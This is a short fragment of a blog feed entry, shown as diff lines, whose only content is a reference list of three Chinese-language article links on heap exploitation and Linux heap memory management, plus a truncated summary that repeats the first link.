-    <content type="html"><![CDATA[<p>####reference<br><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="external">Dance In Heap（二）：一些堆利用的方法（上） </a><br><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="external">堆溢出之unlink的利用</a><br><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.71405f33KyLlt6&amp;articleid=315" target="_blank" rel="external">Linux堆内存管理深入分析</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;####reference&lt;br&gt;&lt;a href=&quot;http://www.freebuf.com/articles/system/151407.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dance In Heap（二）：一些堆利用的方法（上）
     
     </summary>
     
